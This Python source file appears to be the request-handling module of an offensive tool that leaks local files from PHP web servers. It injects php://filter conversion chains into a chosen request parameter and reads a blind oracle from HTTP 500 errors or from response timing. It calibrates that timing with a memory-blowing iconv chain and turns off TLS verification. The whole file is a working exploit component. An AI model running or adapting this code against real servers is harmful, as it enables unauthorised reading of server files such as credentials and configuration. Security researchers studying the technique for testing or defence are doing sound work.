import json
import requests
import time
from filters_chain_oracle.core.verb import Verb

"""
Class Requestor, defines all the request logic.
"""
class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, proxy=None, time_based_attack=False, delay=0.0):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False
    
    def join(self, *x):
        return '|'.join(x)

    """
    Used to see how much time a 500 error takes to calibrate the timing attack
    """
    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    """
    Returns the response of a request defined with all options
    """
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)
        data = {
            self.parameter: f'php://filter/{s}/resource={self.file_to_leak}'
        }
        merged_data = {key: value for (key, value) in (data.items() | self.data.items())}
        if self.verb == Verb.GET:
            requ = requests.get(self.target, params=merged_data, headers=self.headers ,proxies=self.proxies, verify=False)
            return requ
        elif self.verb == Verb.PUT:
            requ = requests.put(self.target, data=merged_data, headers=self.headers ,proxies=self.proxies, verify=False)
            return requ
        elif self.verb == Verb.DELETE:
            requ = requests.delete(self.target, data=merged_data, headers=self.headers ,proxies=self.proxies, verify=False)
            return requ
        elif self.verb == Verb.POST:
            requ = requests.post(self.target, data=merged_data, headers=self.headers ,proxies=self.proxies, verify=False)
            return requ
        else:
            return None

    """
    Used to determine if the answer trigged the error based oracle
    """
    def error_oracle(self, s):
        requ = self.req_with_response(s)
        if self.time_based_attack:
            return requ.elapsed.total_seconds() > (self.time_based_attack/2)
        
        return requ.status_code == 500